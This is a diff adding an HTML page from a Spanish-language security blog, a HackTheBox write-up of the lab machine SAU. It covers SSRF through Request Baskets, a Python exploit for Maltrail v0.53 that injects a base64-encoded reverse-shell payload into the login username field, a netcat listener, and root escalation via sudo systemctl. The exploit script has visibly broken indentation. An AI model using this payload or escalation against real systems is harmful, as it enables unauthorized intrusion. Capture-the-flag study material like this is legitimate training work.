@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- 
+    - primary meta tags
+  -->
+  <title>Wren - Perosonal Blog Website </title>
+  <meta name="title" content="Wren - Perosonal Blog Website">
+  <meta name="description" content="This is a blog html template made by codewithsadee">
+
+  <!-- 
+    - favicon
+  -->
+  <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml">
+
+  <!-- 
+    - google font link
+  -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+	<script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>
+
+  <!-- 
+    - custom css link
+  -->
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="../assets/css/header.css">
+  <link rel="stylesheet" href="../assets/css/contenedor.css">
+  <link rel="stylesheet" href="../assets/css/footer.css">
+  <link rel="stylesheet" href="../assets/css/codigo.css">
+
+  <!-- 
+    - preload images
+  -->
+  <link rel="preload" as="image" href="./assets/images/hero-banner.png">
+  <link rel="preload" as="image" href="./assets/images/pattern-2.svg">
+  <link rel="preload" as="image" href="./assets/images/pattern-3.svg">
+
+</head>
+
+<body id="top">
+
+  <!-- 
+    - #HEADER
+  -->
+  <header class="header">
+		<div class="logo">
+		<img class="logo1" src="./assets/images/logo/menor4.png" alt="">
+		</div>
+	
+		<input type="checkbox" id="toggle">
+		<label for="toggle"><img class="img2"  src="./assets/images/svg/menu.svg" alt="menu"></label>
+	
+	
+		<nav class="navigation">
+			<ul>
+				<li><a href="../index.html"> INICIO </a></li>
+				<li><a href="#"> SEGURIDAD INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTON-HACKING-WIFI/index.html">HACKING WIFI</a></li>
+					<li><a href="../SECTION-HACKING-WEB/index.html">HACKING WEB</a></li>
+					<li><a href="../SECTION-MALWARE/index.html">MALWARE</a></li>
+          <li><a href="../SECTION-BYPASS/index.html">BYPASS</a></li>
+				</ul>
+			</li>
+      <li><a href="#"> INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-LINUX/index.html">LINUX</a></li>
+					<li><a href="../SECTION-PROGRAMACION/index.html">PROGRAMACIÓN</a></li>
+					<li><a href="../SECTION-REDES/index.html">REDES</a></li>
+				
+	
+				</ul>
+			</li>
+				<li><a href="">CTF <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-HACKTHEBOX/index.html">HACKTHEBOX</a></li>
+				
+	
+				</ul>
+	
+				</li>
+				<li><a href="#"> ACERCA DE </a></li>
+			
+			
+			
+			</ul>
+	
+		</nav>
+
+	</header>
+
+  <main class="main-blog">
+
+    <h1 id="h1-main"> HackTheBox Write-Up - SAU</h1>
+
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/sau/001.webp" alt="Imagen HACKTHEBOX" />
+    </div>
+    <p> SAU es una máquina de dificultad fácil en la plataforma de HTB. Conseguiremos acceso a 
+      través de una version de requets basquet en el caso un SSRF y luego la explotacion de la version de Mailtrail 0.53 para 
+      obtener una shell , escalamiento de privilegios usando el binario systemctl.
+    </p>
+
+    <h1 class="titulo"> ENUMERACION </h1>    
+
+    <p> Revisamos la web en el navegador y vemos que podemos crear una carpeta , asi que nos la creamos , para investigar
+        en donde seria el vector de ataque.
+      </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/sau/002.webp" alt="Imagen hacking wifi" />
+      </div>
+
+      <p> Al ingresar a nuestra carpeta que hemos creado , nos redirige a otra pagina y tendremos que poner la configuracion tal
+        como esta en la imagen
+      </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/sau/003.webp" alt="Imagen hacking wifi" />
+      </div>
+      
+      <p> Al hacer la configuracion anterior , ahora podremos revisar el puerto 80 que esta filtrado y que solo se podia ver 
+            en el localhost y nos carga una pagina muy diferente ,pero notamos que hay un "Maltrail v0.53" que tal sea vulnerable.
+      </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/sau/004.webp" alt="Imagen hacking wifi" />
+      </div>
+        
+            <h1>EXPLOTACION</h1>
+
+      <p> Investigando se encontro un script en python para poder aprovechar esa vulnerabilidad .</p>
+      <div class="code-container">
+        <pre class="lenguage-python">
+        <code>
+    #!/bin/pythonn
+    import sys
+    import os
+    import base64
+            
+    # Arguments to be passed
+      YOUR_IP = sys.argv[1]  # <your ip>
+      YOUR_PORT = sys.argv[2]  # <your port>
+      TARGET_URL = sys.argv[3]  # <target url>
+            
+     print("\n[+]Started MailTrail version 0.53 Exploit")
+            
+    # Fail-safe for arguments
+     if len(sys.argv) != 4:
+       print("Usage: python3 mailtrail.py <your ip> <your port> <target url>")
+        sys.exit(-1)
+            
+            
+    # Exploit the vulnerbility
+    def exploit(my_ip, my_port, target_url):
+    # Defining python3 reverse shell payload
+      payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
+    Encoding the payload with base64 encoding
+         encoded_payload = base64.b64encode(payload.encode()).decode()
+        # curl command that is to be executed on our system to exploit mailtrail
+        command = f"curl '{target_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
+        # Executing it
+        os.system(command)
+            
+            
+    print("\n[+]Exploiting MailTrail on {}".format(str(TARGET_URL)))
+        try:
+            exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
+            print("\n[+] Successfully Exploited")
+            print("\n[+] Check your Reverse Shell Listener")
+        except:
+            print("\n[!] An Error has occured. Try again!")</code>
+        </pre>
+        </div>
+        <button class="copy-button">Copiar</button>
+      
+        <p> Primeramente nos ponemos en modo listener para poder recibir la shell en nuestro host.</p>
+        <div class="code-container">
+            <pre class="lenguage-python">
+            <code> <br>   nc -nlvp 9991 </code>
+            </pre>
+            </div>
+            <button class="copy-button">Copiar</button>
+          
+        
+              
+        <p> Ejecutamos el exploit.py remplazando los siguientes espacios.</p>
+        <div class="code-container">
+            <pre class="lenguage-python">
+            <code> <br>   python3 exploit.py 10.10.14.43 9991 http://10.10.11.224:55555/2ws2m0v</code>
+            </pre>
+            </div>
+            <button class="copy-button">Copiar</button>
+        
+        
+        <p> Al ejecutar el exploit , si tenemos suerte nos dara la shell en puerto que estabamos en modo listener.
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/sau/005.webp" alt="Imagen hacking wifi" />
+        </div>
+        <h2>Felicidades!!! , ahora estas dentro del usuario del sistema , ahora nos toca escalar privelegios.</h2>
+
+        <h1>ESCALACION DE PRIVELEGIOS</h1>
+
+        <p> Revisamos algunos permisos del sudo y encontramos un systemctl binario al poner el comando <code class="code-command"> sudo -l </code></p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/sau/006.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Ahora lo interesante es que podemos usar eso binario a nuestro favor ya que podemos ejecutar systemctl status
+        para obtener otra shell. </p>
+        <div class="code-container">
+            <pre class="lenguage-python">
+            <code> <br>   sudo systemctl status trail.service</code>
+            </pre>
+            </div>
+            <button class="copy-button">Copiar</button>
+        
+        <p> Al ejecutar el comando , el resultado sera asi y solo tendremos que escribir <code class="code-command"> !sh </code> para obterner 
+        una nueva shell pero como root.</p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/sau/007.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <h1>Felicidades ya eres usuario root y podras leer la flag dentro de "/root" , esto es todo hasta la pròxima</h1>
+        
+        
+</main>
+
+
+  <!-- 
+    - #BACK TO TOP
+  -->
+  <footer class="footer"> 
+    <div class="izquierda">  
+  
+      <a href="#" id="footer-a"><a href="#">
+        <img src="../assets/images/logo/menorH.png" alt="logo h4ckdino">
+      </a>  © 2023 h4ckdino, Inc. </a>
+      <a href="#" id="footer-a">Ponte en contacto con nosotros</a>
+      <a href="#" id="footer-a" >Configuración de cookies</a>
+      <a href="#" id="footer-a" >Politica de privacidad</a>
+      
+  
+      
+    </div>
+  </footer>
+  
+  
+
+
+
+
+  <!-- 
+    - custom js link
+  -->
+  <script src="./assets/js/script.js"></script>
+
+  <!-- 
+    - ionicon link
+  -->
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
